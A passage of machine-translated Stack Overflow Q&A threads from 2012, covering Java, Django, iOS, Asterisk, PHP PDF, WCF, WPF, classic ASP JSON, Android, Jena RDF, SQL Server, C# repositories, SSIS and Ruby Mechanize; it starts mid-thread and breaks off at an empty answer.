> 时间：2012-05-08T13:12:27.807

你应该使用类似的东西

```
public class YourClass {
    private static int generalIdCount = 0;
    private int id;

    public YourClass() {
        this.id = generalIdCount;
        generalIdCount++;
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:12:52.750

使用所有实例共享的静态计数字段`Person`：

```
class Person {
    private static int nextId = 1;
    private final int id;

    Person() {
        id = nextId++;
    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-08T13:13:11.100

您可以为当前计数器值创建一个静态变量，并在创建时将其分配给 ID...

```
public class Person {

    // same across all instances of this class
    static int currentCounter = 0;

    // only for this instance
    int personId;

    public Person(){
        personId = currentCounter;
        currentCounter++;
    }
} 
```

# python - Python、MySQL、Django：为表列设置默认值

> ID：10499258
> 
> 赞同：3
> 
> 时间：2012-05-08T13:08:46.357
> 
> 标签：python, mysql, django

我的表在 Python 中被指定为模型，然后由 Django 制作成 MySQL 表。在 Python 中：

```
class my_table(models.Model):
    is_correct = models.IntegerField(default = 0) 
```

如果我在此表中插入，那么我希望它自动为该列插入 0，`is_correct`除非我指定不同的值。如果我使用原始 sql 或从 MySQL 存储过程插入，我也希望发生这种情况。

这个`default`论点似乎只在 Python 中起作用。它没有被翻译成 MySQL 看到的任何东西。这样的事情可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:25:27.237

是的，`default`论点适用于 django 级别。如果要将其移动到`mysql`，请手动执行`ALTER TABLE ...`查询。

您也可以尝试扩展`models.IntegerField`和[覆盖](https://docs.djangoproject.com/en/dev/howto/custom-model-fields/#django.db.models.Field.db_type) `db_type`. 但它应该为每个领域做......

# iphone - 导航控制器无法正常工作

> ID：10499259
> 
> 赞同：0
> 
> 时间：2012-05-08T13:08:51.710
> 
> 标签：iphone, xcode, uinavigationbar

我在我当前的应用程序中使用导航控制器，但我在 iOS4 和 iOS5 的导航控制器上遇到了问题，所以我尝试为 iOS 4 和 5 编写代码

```
if([[UINavigationBar class] respondsToSelector:@selector(appearance)]) //iOS >=5.0
{
    [self.navigationController.navigationBar setBackgroundImage:image forBarMetrics:UIBarMetricsDefault];
}
else
{
    self.navigationController.navigationBar.layer.contents = (id)[UIImage imageNamed:@"header.png"].CGImage;
} 
```

但问题是当我在 iOS 4 版本上运行我的应用程序时，我的导航控制器看起来像这样。![在此处输入图像描述](../Images/e47771751314b2d563bf13bac1df1c17.png)

请建议我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-14T10:26:38.547

感谢经过长时间的搜索，我尝试了这段对我有帮助的代码。

# 导入“ImageViewController.h”

```
@implementation UINavigationBar (CustomImage)

- (void)drawRect:(CGRect)rect {
    UIImage *image = [UIImage imageNamed:@"background.png"];
    [image drawInRect:CGRectMake(0, 0, self.frame.size.width, self.frame.size.height)];
}

@end
implement this code in your .m file

@implementation ImageViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationController.navigationBar.tintColor = [UIColor blackColor];
    UIImageView *backGroundView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"background.png"]];
    [self.navigationController.navigationBar insertSubview:backGroundView atIndex:0];
    [backGroundView release];
}

@end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-14T11:14:20.600

```
UINavigationController *navControl; 
```

在其他部分，尝试这样。

```
UINavigationBar *navBar = self.navControl.navigationBar;
   UIImageView *imgView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 320, 44)];
            imgView.image = [UIImage imageNamed:@"header.png"];
            [navBar addSubview:imgView];
            [imgView release]; 
```

# asterisk - 将数据保存到自定义 cdr 字段中

> ID：10499261
> 
> 赞同：4
> 
> 时间：2012-05-08T13:08:55.063
> 
> 标签：asterisk, pbx, cdr, trixbox

我创建了自定义字段“rec_name”id 表“cdr”，数据库“asteriskcdrdb”。在此字段中，我想存储录音名称。我知道我应该通过在其中一个 .conf 文件中添加这一行来做到这一点，但是在哪里呢？

`exten => s,1,set(CDR(rec_name)=${CALLFILENAME})`

我也可以通过sql语句来完成，但我不知道将调用细节保存到数据库中的文件在哪里。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-10T05:44:32.470

对于 mysql，您需要添加到 /etc/asterisk/cdr_mysql.conf

```
[aliases]
rec_name=rec_name 
```

如果您有别名部分，只需添加到它

```
rec_name=rec_name 
```

# php - 按照 php 中的块在 pdf 中写入

> ID：10499263
> 
> 赞同：1
> 
> 时间：2012-05-08T13:08:56.250
> 
> 标签：php, pdf, tcpdf, chunks

对于有限的块大小，我可以写在同一个 PDF 文件中吗？例如，我有 12MB 的数据，我必须将 4 次作为拆分记录写入 PDF 文件，并且必须在 EOF 中追加新数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T17:11:42.377

您无法使用 TCPDF 打开现有的 PDF，因此仅使用它是不够的。见[http://sourceforge.net/projects/tcpdf/forums/forum/435311/topic/4575080](http://sourceforge.net/projects/tcpdf/forums/forum/435311/topic/4575080)

但是您可以使用[FPDI](http://www.setasign.de/products/pdf-php-solutions/fpdi/)导入页面，从 v1.2.1 开始也可以与 TCPDF 一起使用，并且有[示例代码](http://www.setasign.de/products/pdf-php-solutions/fpdi/demos/tcpdf-demo/)

或者，您可以生成单独的 pdf 文档并使用[pdftk](http://www.ghacks.net/2007/10/02/merge-pdf-files/)之类的东西来合并它们。

至于用 PHP 处理位于磁盘上的大文件。您可以使用[fopen、fread](http://www.ibm.com/developerworks/library/os-php-readfiles/)和朋友。[ibm developerworks](http://www.ibm.com/developerworks/library/os-php-readfiles/)上有一篇很好的文章，我也有一篇关于[SO的文章](https://stackoverflow.com/questions/4694394/break-a-large-file-into-many-smaller-files-with-php)

# c# - 第一次执行时未找到 WCF 端点，在第二次执行时找到

> ID：10499267
> 
> 赞同：2
> 
> 时间：2012-05-08T13:09:10.007
> 
> 标签：c#, wcf

我会设置场景。

我们有一组 WCF 服务主机*（S1、S2...Sn）*，它们在链中运行以处理接收到的消息，第一个服务进行一些处理，然后将消息传递给下一个服务进行更多处理，等等上。最终的 WCF 服务*(U)*接收 Sn 的输出并对其进行验证。

服务*S1、S2、...Sn*通过独立于服务*U*的 .exe 文件启动。服务*U*从 Visual Studio 2010 的单元测试启动，一旦启动，就会向服务 s1 发送一条消息进行处理。我们看到的问题是，一旦服务*Sn*尝试将消息传递给服务 U 进行验证，我们就会遇到错误：

> [在http://localhost:9005/ValidationService.svc](http://localhost:9005/ValidationService.svc)没有端点监听

奇怪的是这个错误只发生在第一次运行单元测试时。如果我们在初始失败后重新运行测试，测试将毫无问题地通过（*Sn*成功将消息传递给*U*）。但是，关闭服务*S1、S2、...Sn*重新启动并重新运行单元测试会导致在第一次运行测试时再次抛出“没有端点正在侦听...”。

我的想法是，服务*U*可能仍在完成其打开过程，而服务*Sn*尝试向它发送消息，但是我不相信，如果是这种情况，我们如何确保服务 U 已打开并在发送消息之前进行侦听进入S1？

服务*U*由以下代码启动：

```
 public void TestChain()
    {
        var binding = new BasicHttpBinding();

        // Construct service U
        var serviceHostU = new ServiceHost(typeof(ChainContract), "http://localhost:9005");
        serviceHostU.AddServiceEndpoint(typeof(ChainContractImplementation), binding, "ValidationService.svc");
        serviceHostU.Open();

        //fire message into service s1
        var ep = new EndpointAddress("http://localhost:8777/InputService.svc");
        var inputFactory = new ChannelFactory<ChainContract>(binding, ep);
        var channel = inputFactory.CreateChannel();
        //fire a message into service s1.
        channel.ReceiveMessage(new TestMessage());

        serviceHostU.Close();
        } 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:22:39.363

我认为您假设第一个 ServiceHost 正在初始化，而第二个 ServiceHost 进行调用可能是正确的。

要处理此问题，您可以将委托挂接到您的 ServiceHost 的 Opened 事件并从那里运行您的第二个服务。

# php - 如何使服务器每个用户都可以访问一个子域（apache，php）？

> ID：10499268
> 
> 赞同：0
> 
> 时间：2012-05-08T13:09:14.240
> 
> 标签：php, apache, dns

我正在尝试执行一些简单的操作，但我不确定最好的方法是什么。这是问题所在：

基础设施：1) 一台仅用于注册目的的主服务器 2) 为我们的 Web 应用程序服务的其他 10 台计算机（在 php 中）

1) 用户注册 Web 应用程序 2) 我们的安装逻辑将在 10 个可用服务器中找到免费服务器并在那里安装所有内容 3) 用户获取他的应用程序 username.mywebsite.com 的 url 4) 当用户键入 username.mywebsite.com 时，他会被重定向到适当的服务器。此外，还需要不将 url 从 username.mywebsite.com 更改为其他任何内容。

我已经在 apache 配置和重定向中尝试了虚拟主机，但找不到有效的解决方案。

有人知道如何实现这一目标吗？

# ios - iPad 主细节应用程序 - 更改细节视图控制器的内容

> ID：10499269
> 
> 赞同：1
> 
> 时间：2012-05-08T13:09:14.373
> 
> 标签：ios, ipad, uisplitviewcontroller, master-detail

我开始在 XCode 中用一个新的主细节项目探索 UISplitViewController 类，我想用另一个 UIViewControllers 替换细节视图的内容。我是这样写的（self是细节视图控制器，控制器是uiviewcontroller，我想用它替换第一个）：

```
self.view = controller.view; 
```

我的问题是：这是一种正确的方式，苹果会接受吗？如果不是，我怎么能做得更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:43:59.203

您可以替换在您的应用程序委托“didFinishLaunchingWithOptionsMethod”中设置的详细视图控制器。您的方法可能也有效，但会产生不必要的开销。他们为左侧的导航控制器和右侧的视图控制器提供默认的自动生成代码，但您可以将其更改为您需要的任何内容。我有一个项目，其中有两个导航控制器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-24T11:56:53.903

我还在 UIIntelligentSplitViewController 中使用 Master - Detail View Controllers 构建 iPad 应用程序。由于 UISplitViewController 在更改为不同的方向时不能很好地支持，因此使用 UIIntelligentSplitViewController 可以解决方向更改的问题。[在这里](https://github.com/grgcombs/IntelligentSplitViewController)查看更多。

我已经阅读了一个苹果文档以及一个最佳实践，我们应该在整个应用程序中只使用一个 MasterView 和 DetailView 控制器，并以这样一种方式编写代码，即根据所选对象将所有数据加载到这两个视图中。

但是在同一个详细视图中加载所有数据可能需要很多代码。因此，我也在寻找有效编写代码以加载到同一详细视图控制器中的答案。但是目前我只实现了两个视图来显示网络数据。

如果有任何其他有效的方法来完成它，请提及。谢谢。

# wpf - 未在组合框中选择项目

> ID：10499270
> 
> 赞同：0
> 
> 时间：2012-05-08T13:09:17.887
> 
> 标签：wpf, combobox, lookup

我需要 WPF 组合框的以下行为：
我需要组合框中的自动过滤器。从[这里](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/cec1b222-2849-4a54-bcf2-03041efcf304/)执行。但是当下拉菜单中有几个几乎相同的项目时 - 当我按下 DOWN 时，它只会从列表中选择第一个并隐藏其他项目（请参阅此处的当前行为视频：[http ://www.youtube.com/watch?v= _WYAgMTxc4M](http://www.youtube.com/watch?v=_WYAgMTxc4M)）。如果我想要第二种可能 - 我必须用鼠标选择它或在组合框的可编辑部分写下整个项目显示名称。例如，在我按下 ENTER 之前，是否可以在不更改组合框的可编辑部分的情况下选择项目？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:55:08.520

我认为问题是当您选择该项目时，它会填充**ComboBox**的文本区域，而不是通知过滤器文本已更改并为列表应用新过滤器，并且列表中仅保留一项。

**您应该重写此行为，仅在触发KeyPressed** / **KeyDown** / **KeyUp**事件时才应用过滤器。

# json - 使用 ASP Xtreme Evolution 在经典 ASP 中解析 JSon

> ID：10499272
> 
> 赞同：3
> 
> 时间：2012-05-08T13:09:23.237
> 
> 标签：json, asp-classic

我正在开发一个经典的 ASP 项目，我使用 ASP Xtreme Evolution 来解析 JSon 数据（可在此处找到：http: [//zend.lojcomm.com.br/entries/classic-asp-json-revisited/](http://zend.lojcomm.com.br/entries/classic-asp-json-revisited/)）

无论如何...我正确获取了大部分 JSon 数据，但现在我被困在一个数组上。

JSON看起来像这样：

```
{
  "Product": {
    "ID": "6666",
    "Name": "Tha name",
    "ArticleGroup": [
      {
        "@handleas": "array",
        "Title": "Title 1",
        "Article": {
          "ID": "777",
          "Label": "Label 1",
        }
      },
      {
        "@handleas": "array",
        "Title": "Title 2",
        "Article": {
          "ID": "888",
          "Label": "Label 2",
        }
      }
    ]
    }
  }
} 
```

ASP 看起来像这样：

```
set xmlHTTP = server.createobject("MSXML2.ServerXMLHTTP.6.0")
xmlHTTP.open "GET", "http://source.of.json", false
xmlHTTP.send()
ProductFeed = xmlHTTP.ResponseText

dim ProductInfo : set ProductInfo = JSON.parse(join(array(ProductFeed)))

    dim key : for each key in ProductInfo.Product.keys()
        Response.Write ProductInfo.Product.ID ' Prints 6666
        Response.Write ProductInfo.Product.Name ' Prints Tha Name
    Next
    set ProductInfo = nothing 
```

我的问题是我无法弄清楚如何访问 ArticleGroup 中的信息。我得到的只是 [object Object]、[object Object] 或空值。

有人有想法么？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T14:31:26.710

尝试以下操作（基于给定的 JSON）：

```
Dim ArticleGroup

dim key : For Each key in ProductInfo.Product.keys()
    Response.Write ProductInfo.Product.ID ' Prints 6666
    Response.Write ProductInfo.Product.Name ' Prints Tha Name            

    For Each ArticleGroup In ProductInfo.Product.Get("ArticleGroup") '' iterate all ArticleGroup entries
        Response.write ArticleGroup.Get("Title") '' get the correct key value
    Next
Next 
```

您需要遍历所有 ArticleGroup 条目并通过`.get(keyName)`. 否则它将返回 JScript 函数体。

# java - 有条件地在 Android 中使用 OnDraw() 函数

> ID：10499275
> 
> 赞同：0
> 
> 时间：2012-05-08T13:09:36.263
> 
> 标签：java, android

我想知道我们是否可以根据某些标志有条件地调用 Android 的 Ondraw() 方法。例如`ondraw()`，仅在解码特定帧时才应调用。

考虑这种情况：

```
decoder();  /// @NDK 

set flag;   

if (Flag==set)

{

OnDraw() works and displays an image

}       

else

OnDraw sleeps; 
```

我们可以在 Android 中实现这种类型的活动，如果可以，那么如何实现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T18:47:14.807

在您的评论中，您要求提供一些示例代码。我想你的布局中有一个自定义视图，它显示解码的帧。原则上它可能看起来像这样：

```
class FrameView extends View {

    private Bitmap mBitmap;

    public FrameView(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    @Override
    protected void onDraw(Canvas canvas) {
        //Your drawing logic
        canvas.drawBitmap(mBitmap,0,0, null);
    }

    private void setFrame(final Bitmap b){
        if (mBitmap!=null){
            mBitmap.recycle();
        }
        mBitmap = b;
        //trigger onDraw, if this method is not called from a ui thread switch to postInvalidate()
        this.invalidate();
    }
} 
```

您可以通过在活动中调用 findViewById() 来获取此视图的句柄。然后在您的解码线程中，您在视图上调用 setFrame。如果从 UI 线程外部调用 setFrame，请注意使用 postInvalidate()。

# xml - 使用 jena 从 XML 文件创建 RDF

> ID：10499281
> 
> 赞同：1
> 
> 时间：2012-05-08T13:09:46.217
> 
> 标签：xml, xml-parsing, rdf, semantic-web, jena

> **可能重复：**
> [从 XML 创建 RDF](https://stackoverflow.com/questions/10385143/create-rdf-from-xml)

很抱歉第二次问这个问题，我仍然在从以下 xml 文件生成 rdf 时遇到问题。

```
<xml>
<person>
<name>Joe</name>
<website url="www.example1.com">contact1</website >
<vote>20</vote>
</person>
<person>
 <name>Anna</name>
<website url="www.example2.com">contact2</website>
 <vote>80</vote>
 </person>
 </xml> 
```

我认为使用 jena 可能会解决问题，但我不知道该怎么做，因为每个都有三个属性，我希望输出如下所示

```
<rdf:Description rdf:about="http://www.example.com/xml">
 <j.0:hasCritic>Joe</j.0:hasCritic>
 <rdf:Description rdf:about=Joe >
 <j.0:haswebsite>"www.example1.com"</j.0:haswebsite>
  <j.0:hascontact>contact1</j.0:hascontact>
  <j.0:hasvote>80</j.0:hasvote>
 </rdf:Description>
<j.0:hasCritic>Anna</j.0:hasCritic>
 <rdf:Description rdf:about=Anna>
 <j.0:haswebsite>"www.example2.com"</j.0:haswebsite>
  <j.0:hascontact>contact2</j.0:hascontact>
  <j.0:hasvote>20</j.0:hasvote> 
```

提前感谢您的帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T11:16:50.157

您无法使用 Jena 解析 XML，除非它是 RDF/XML。

您必须使用 XLST 将 XML 转换为 RDF 或使用 Java XML 库解析 XML 以获取数据并从感兴趣的数据创建三元组。

使用 XSLT 相当简单，如下例所示。

由于该网站是 URL，因此我将其用作 URI 而不是文字。此外，FOAF 是常见的名称。所以，我会使用类似的东西：

```
<xsl:stylesheet version="1.0"
            xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
            xmlns:html="http://www.w3.org/1999/xhtml"
            xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
            xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
            xmlns:foaf="http://xmlns.com/foaf/spec/"
            xmlns:foo="http://example.com/foo#">

<xsl:template match="/">
    <rdf:RDF>
        <rdf:Description rdf:about="http://www.example.com/xml">
            <xsl:apply-templates/>
    </rdf:Description>
    </rdf:RDF>
</xsl:template>

<xsl:template match="person">
<xsl:variable name="critic"><xsl:value-of select="name"/></xsl:variable>
<xsl:variable name="criticWebsite"><xsl:value-of select="website/@url"/</xsl:variable>
<foo:hasCritic>
    <rdf:Description rdf:about="http://www.example.com/critic/{$critic}">
        <foaf:name><xsl:value-of select="name"/></foaf:name>
        <foaf:homepage>
            <rdf:Description rdf:about="http://{$criticWebsite}">
                <rdfs:label><xsl:value-of select="website"/></rdfs:label>
            </rdf:Description>
        </foaf:homepage>
    </rdf:Description>
</foo:hasCritic>
</xsl:template>

</xsl:stylesheet> 
```

这会给你：

```
<?xml version="1.0"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
    xmlns:html="http://www.w3.org/1999/xhtml"
    xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
    xmlns:foaf="http://xmlns.com/foaf/spec/"
    xmlns:foo="http://example.com/foo#">

    <rdf:Description rdf:about="http://www.example.com/xml">
        <foo:hasCritic>
            <rdf:Description rdf:about="http://www.example.com/critic/Joe">
                <foaf:name>Joe</foaf:name>
                <foaf:homepage>
                    <rdf:Description rdf:about="http://www.example1.com">
                        <rdfs:label>contact1</rdfs:label>
                    </rdf:Description>
                </foaf:homepage>
            </rdf:Description>
        </foo:hasCritic>
        <foo:hasCritic>
        <rdf:Description rdf:about="http://www.example.com/critic/Anna">
            <foaf:name>Anna</foaf:name>
                <foaf:homepage>
                    <rdf:Description rdf:about="http://www.example2.com">
                        <rdfs:label>contact2</rdfs:label>
                    </rdf:Description>
                </foaf:homepage>
            </rdf:Description>
        </foo:hasCritic>
        </rdf:Description>
    </rdf:RDF> 
```

然后您可以将 RDF 文件加载到 Jena

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T16:40:27.813

我建议使用 XSLT 将该 XML 转换为 RDF。因为它可能是非常规则的，所以 XSLT 将很容易编写和应用来获得您想要的 RDF。然后，您可以使用 Jena 解析生成的 RDF 并对其进行处理。

# sql - SQL 捕获远程过程引发的警告

> ID：10499283
> 
> 赞同：1
> 
> 时间：2012-05-08T13:09:47.750
> 
> 标签：sql, sql-server, warnings

我有一个问题，我从链接服务器调用存储过程并且它超时。但是我没有很好的方法来捕捉这个。虽然它很少发生，但我想知道是否有任何方法可以捕捉到这个特定的警告：

> 链接服务器“serverName”的 OLE DB 提供程序“SQLNCLI10”返回消息“查询超时已过期”。

不幸的是，try/catch 没有捕获警告，MS 确实有一个未解决的问题，这应该是一个错误：[http ://connect.microsoft.com/SQLServer/feedback/details/337043/no-error-raised-when-远程程序超时](http://connect.microsoft.com/SQLServer/feedback/details/337043/no-error-raised-when-a-remote-procedure-times-out)

我不想增加 timeout 属性，我知道我可以这样做：

```
Declare @ret int
select @ret =  4417
Exec @ret=Server.DB.dbo.RemoteSP 
```

如果之后@ret 为空，则意味着调用失败，但它并没有告诉我确切的原因是什么。无论如何，基本上可以捕捉到这个警告吗？远程过程调用错误处理的最佳实践是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-02-05T09:46:15.490

截至 2019 年，仍然无法正确捕获 SQL Server 远程超时错误。

它既适用于远程 SP 调用，也适用于`execute ('select 1') at REMOTESQLSERVER`.

根据[N.Nelu 的评论](https://social.msdn.microsoft.com/Forums/sqlserver/en-US/b876cf7a-4810-4bbd-9e04-4dd9f56c60c6/job-step-successful-but-linked-server-timeout-means-it-actually-fails?forum=sqltools)：

[Microsoft 文档](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/try-catch-transact-sql?view=sql-server-2017)在“不受 TRY...CATCH 构造影响的错误”下声明。

**不受 TRY...CATCH 构造影响的错误**

TRY...CATCH 构造不会捕获以下条件：

*   严重性为 10 或更低的警告或信息性消息。

*   严重性为 20 或更高的错误会停止会话的 SQL Server 数据库引擎任务处理。如果发生严重程度为 20 或更高的错误并且数据库连接未中断，则 TRY...CATCH 将处理该错误。

*   **注意，例如客户端中断请求或断开的客户端连接。**

*   当系统管理员使用 KILL 语句结束会话时。

[您提供的连接链接已失效，但您仍然可以在此处](https://feedback.azure.com/forums/908035-sql-server/suggestions/32894512-no-error-raised-when-a-remote-procedure-times-out)投票修复此*功能* 。另请参阅*4.3 链接服务器上的查询超时*下[有关 SQL 错误处理的优秀文章](http://www.sommarskog.se/error_handling/Appendix1.html)。

# c# - ClientBase 和 https 连接。提供的 URI 方案“https”无效；预期的“http”。参数名称：via

> ID：10499287
> 
> 赞同：1
> 
> 时间：2012-05-08T13:10:02.523
> 
> 标签：c#, wcf, rest, client

我正在尝试使用`ClientBase`该类与 REST 服务进行通信。下面是我的代码：

```
class MyService: ClientBase<IMyService>, IMyService
{
    public GridVisionService(Uri baseAddress)
        : base(new WebHttpBinding(), new EndpointAddress(baseAddress))
    {
        this.Endpoint.Behaviors.Add(new WebHttpBehavior());
    }

    #region IMyServiceMembers

    public void DoSomething()
    {
        using (new OperationContextScope(this.InnerChannel)) // Line that throws the exception
        {
            WebOperationContext.Current.OutgoingRequest.Headers.Add("details", "details");
        } // End of OperationContextScope

        this.Channel.DoSomething();
    }

    #endregion
} 
```

我像下面这样运行我的课程：

```
MyService myService = new MyService(new Uri("https://localhost:8080/MyService/")); 
```

但是，它会抛出关于期望 HTTP 而不是 HTTPS 的异常。在搜索时，我发现了相同错误的多个实例，但是在所有情况下，我发现 app.config 正在配置连接。就我而言，我不是。有谁知道我怎样才能让我的服务期望使用 https？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T15:47:29.243

创建 WebHttpBinding 时，将其 Security 属性设置为 Transport。

```
System.ServiceModel.WebHttpBinding w = new System.ServiceModel.WebHttpBinding();
w.Security = new System.ServiceModel.WebHttpSecurity();
w.Security.Mode = System.ServiceModel.WebHttpSecurityMode.Transport; 
```

# c# - C# .NET 设计模式问题

> ID：10499289
> 
> 赞同：4
> 
> 时间：2012-05-08T13:10:09.697
> 
> 标签：c#, .net, design-patterns

我正在尝试实现最佳的代码可重用性。问题是我无法通过存储库访问位于主程序的基本抽象类中的基本方法。

如果您浏览下面的示例，您将看到我的情况的示例代码。

所以我的问题是如何从主程序访问位于基本抽象类中的方法。

类/接口

```
public abstract class BaseEntity
{
    public override abstract String ToString();
}

public abstract class BaseClass<T> where T : BaseEntity
{
    public T GetById(int id)
    {
        //Dummy Code
        return new T();
        //
    }
}

public interface IFooRepository
{
    IList<Foo> GetOrderedObjects();
}

public interface FooRepository : BaseClass<Foo>, IFooRepository
{
    public IList<Foo> GetOrderedObjects()
    {
        //GetById method is accessible from the repository - Fine
        var obj = this.GetById(5);

        //Dummy Code
        return new List<Foo>();
        //
    }
} 
```

//主应用

```
public class void Main()
{
    private IFooRepository _fooRepository;

    public void ProgramStartsHere()
    {
         //This is ok.
         var list = _fooRepository.GetOrderedObjects();

         //Problem is here - GetById method is not accessible from the main program through the FooRepository
         var obj = _fooRepository.GetById(10);
    }
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-08T13:15:37.977

GetById 未在接口中定义

我会做一个

```
public interface IBaseRepository<T> where T : BaseEntitiy {
 T GetById<T>(int id);
} 
```

然后`BaseClass`实现`IBaseRepository<T>`

并`IFooRepository`继承自`IBaseRepository<Foo>`

编辑 ：

一个完整的示例，类似于@Olivier JD 一个，有想法（可能是错误的），GetOrderedObject 可能对于您的所有实体都是相同的。

```
public abstract class BaseEntity
{
    public override abstract String ToString();
}

//all generic methods
public interface IRepositoryBase<T>
    where T : BaseEntity, new()
{
    T GetById(int id);
    IList<T> GetOrderedObjects();

}

//all methods specific to foo, which can't be in a generic class
public interface IFooRepository :IRepositoryBase<Foo>
{
    void Update(Foo model);
}

//implementation of generic methods
public abstract class BaseClass<T> : IRepositoryBase<T>
    where T : BaseEntity, new() // ===> Add new() constraint here
{
    public T GetById(int id)
    {
        return new T();
    }
    public IList<T> GetOrderedObjects() {
        var obj = this.GetById(5);

        //Dummy Code
        return new List<Foo>();
        //
    }
}

//implementation of Foo specific methods
public class FooRepository : BaseClass<Foo>, IFooRepository
{
    public void Update(Foo model) {
    //bla bla
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-08T13:38:24.890

添加一个新的接口，该接口声明该`GetById`方法并从它继承`IFooRepository`和`BaseClass<T>`继承。您还必须添加一个泛型类型参数`IFooRepository`。（我重命名`IFooRepository`为`IRepository<T>`，因为它现在是通用的。）

```
public abstract class BaseEntity
{
    public override abstract String ToString();
}

public interface IRetriever<T>
    where T : BaseEntity, new()
{
    T GetById(int id);
}

public interface IRepository<T> : IRetriever<T>
    where T : BaseEntity, new()
{
    IList<T> GetOrderedObjects();
}

public abstract class BaseClass<T> : IRetriever<T>
    where T : BaseEntity, new() // ===> Add new() constraint here
{
    public T GetById(int id)
    {
        return new T();
    }
}

public class FooRepository : BaseClass<Foo>, IRepository<Foo>
{
    public IList<Foo> GetOrderedObjects()
    {
        var obj = this.GetById(5);
        return new List<Foo>();
    }
} 
```

这将工作正常

```
IRepository<Foo> _fooRepository = new FooRepository();
var list = _fooRepository.GetOrderedObjects();
var obj = _fooRepository.GetById(10); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-08T13:14:33.500

您`_fooRepository`继承自`IFooRepository`, not `FooRepository`，因此它无权访问`GetById(10);`

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-05-08T13:43:26.043

您必须在存储库接口中公开该`GetById`方法。

```
public interface IFooRepository
{  
    IList<Foo> GetOrderedObjects();
    Foo GetById(int id);
} 
```

或者，您可以使用类型参数约束，如 Raphaël Althaus 所述

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2012-05-08T13:12:36.170

IFooRepository 不继承自 BaseClass，因此您必须将 _fooRepository 强制转换为 FooRepository。然后您可以访问 GetById()

* * *

## 回答 #6

> 赞同：-5
> 
> 时间：2012-05-08T13:13:33.750

将其转换为基类。

```
var obj = ((BaseClass<Foo>)_fooRepository).GetById(10); 
```

# sql-server-2008 - 是否可以在 SQL Server 2008 上部署 SSIS 2012 包

> ID：10499290
> 
> 赞同：19
> 
> 时间：2012-05-08T13:10:09.443
> 
> 标签：sql-server-2008, visual-studio-2010, ssis, ssis-2012

我有一个使用 Visual Studio 2010 在 SSIS 2012 中开发的包。

*   是否可以在 SQL Server 2008 上部署/附加此包

*   如果可能的话，sql server 的许可证是否重要

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-05-08T13:47:26.947

不，你不能。SSIS 包不向后兼容。

如果你仔细考虑它也没有多大意义。如果反过来，“也许”可以这样做，因为 2012 会以某种方式知道 2008 结构，但 2008 引擎不知道 2012 包结构。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-05-24T11:58:49.340

您不能使用 2008 版本的 dtexec 运行它，当然也不能将其部署到目录中，但是如果您可以将运行 SSIS 2012 所需的最低配置安装到服务器上，那么您可以使用 2012 版本的文件系统执行该包[执行程序](http://msdn.microsoft.com/en-us/library/hh231187.aspx)。

另请参阅[http://msdn.microsoft.com/en-us/library/bb522577.aspx](http://msdn.microsoft.com/en-us/library/bb522577.aspx)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-08T13:42:37.207

最好的猜测是否定的。运行 SSIS 包的引擎必须与代码的发布级别相匹配。您无法在低于包的开发级别的任何版本级别上运行任何 SSIS 包（即 2005 服务器不会运行 2008 包等）

这不是许可证问题，而是引擎问题。SSIS 引擎代码随每个版本而更改，因此代码将在不支持包的功能或结构的引擎中运行。

# ruby - 使用 Mechanize gem 根据它们在 DOM 中的位置返回一组链接

> ID：10499305
> 
> 赞同：6
> 
> 时间：2012-05-08T13:11:14.233
> 
> 标签：ruby, nokogiri, mechanize

我正在与机械化作斗争。我希望“单击”一组链接，这些链接只能通过它们的位置（div#content 中的所有链接）或它们的 href 来识别。

上面这两种识别方法我都试过了，都没有成功。

从文档中，我无法弄清楚如何根据它们在 DOM 中的位置返回链接集合（用于单击），而不是直接通过链接上的属性。

其次，[文档](http://mechanize.rubyforge.org/GUIDE_rdoc.html)建议您可以使用 :href 匹配部分href，

```
page = agent.get('http://foo.com/').links_with(:href => "/something") 
```

但我能让它返回链接的唯一方法是传递一个完全限定的 URL，例如

```
page = agent.get('http://foo.com/').links_with(:href => "http://foo.com/something/a") 
```

如果我想返回带有 href 的链接集合，这不是很有用

```
http://foo.com/something/a
http://foo.com/something/b
http://foo.com/something/c
etc... 
```

难道我做错了什么？我有不切实际的期望吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-08T14:18:26.620

